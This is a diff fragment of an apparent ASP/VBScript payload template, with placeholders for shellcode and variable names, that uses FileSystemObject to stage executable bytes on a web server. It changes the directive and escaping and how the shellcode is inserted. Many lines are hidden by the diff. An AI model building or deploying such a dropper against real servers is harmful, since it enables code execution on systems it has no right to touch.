@@ -1,6 +1,7 @@
-<%
+<%% @language="VBScript" %%>
+<%% 
 	Sub %{var_func}()
-		%{var_bytes}=Chr(%{exe[0]})%{var_shellcode}
+		%{var_shellcode}
 		Dim %{var_obj}
 		Set %{var_obj} = CreateObject("Scripting.FileSystemObject")
 		Dim %{var_stream}
@@ -20,4 +21,4 @@
 	End Sub
 
 	%{var_func}
-%>
+%%>
